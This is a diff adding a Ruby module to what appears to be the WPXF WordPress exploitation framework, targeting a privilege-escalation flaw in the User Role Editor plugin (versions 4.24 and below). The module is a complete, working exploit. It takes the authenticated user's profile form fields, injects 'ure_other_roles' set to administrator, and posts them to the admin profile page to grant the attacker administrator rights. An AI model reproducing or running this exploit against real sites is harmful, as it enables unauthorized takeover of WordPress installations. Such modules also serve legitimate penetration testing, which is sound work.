@@ -1,0 +1,55 @@
+class Wpxf::Auxiliary::UserRoleEditorPrivilegeEscalation < Wpxf::Module
+  include Wpxf::WordPress::User
+
+  def initialize
+    super
+
+    update_info(
+      name: 'User Role Editor <= 4.24 Privilege Escalation',
+      desc: 'The User Role Editor plugin, in versions 4.24 and below, '\
+            'allows authenticated users to escalate their user role to '\
+            'that of an administrator.',
+      author: [
+        'Rob Carr <rob[at]rastating.com>' # WPXF module
+      ],
+      references: [
+        ['WPVDB', '8432'],
+        ['URL', 'https://www.wordfence.com/blog/2016/04/user-role-editor-vulnerability/']
+      ],
+      date: 'Apr 04 2016'
+    )
+  end
+
+  def check
+    check_plugin_version_from_readme('user-role-editor', '4.25')
+  end
+
+  def requires_authentication
+    true
+  end
+
+  def build_update_body
+    fields = wordpress_user_profile_form_fields(session_cookie)
+    return nil unless fields
+    fields.merge('ure_other_roles' => 'administrator')
+  end
+
+  def run
+    return false unless super
+
+    body = build_update_body
+    unless body
+      emit_error 'Failed to build payload'
+      return false
+    end
+
+    res = execute_post_request(url: wordpress_url_admin_profile, body: body, cookie: session_cookie)
+    unless res.code == 302 || res.code == 200
+      emit_error "Request returned code #{res.code}"
+      return false
+    end
+
+    emit_success "User role for #{datastore['username']} has been escalated to administrator"
+    true
+  end
+end
